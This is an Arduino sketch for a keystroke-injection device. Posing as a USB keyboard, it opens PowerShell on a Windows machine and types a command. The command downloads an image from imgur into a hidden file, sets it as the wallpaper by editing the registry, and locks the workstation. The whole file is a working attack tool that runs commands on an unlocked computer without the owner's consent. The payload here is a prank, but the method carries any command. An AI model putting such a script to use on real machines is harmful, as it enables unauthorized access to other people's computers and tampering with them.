#include "Keyboard.h"

#define CONTROL_PIN 2

void setup() {
  pinMode(CONTROL_PIN,INPUT);
  Keyboard.begin();
}

void loop() {
    while(digitalRead(CONTROL_PIN) == false){}
    delay(100);
    Keyboard.press(KEY_LEFT_GUI);
    Keyboard.press('r');
    Keyboard.releaseAll();
    delay(100);
    Keyboard.println("powershell");
    delay(100);
    Keyboard.println(R"($pathToJpg=("{0}{1}" -f (Get-Location),"/.hoff.jpg");Invoke-WebRequest "https://i.imgur.com/4VdAwU5.jpg" -OutFile $pathToJpg;reg add "HKEY_CURRENT_USER\control panel\desktop" /v wallpaper /t REG_SZ /d $pathToJpg /f;For($i=0;$i -le 100;$i++){rundll32.exe user32.dll,UpdatePerUserSystemParameters};Start-Process powershell -ArgumentList "sleep 1;rundll32.exe user32.dll,LockWorkStation" -WindowStyle Hidden;Exit;)");
    Keyboard.press(KEY_RETURN);
    Keyboard.releaseAll();
    while(true){}
}
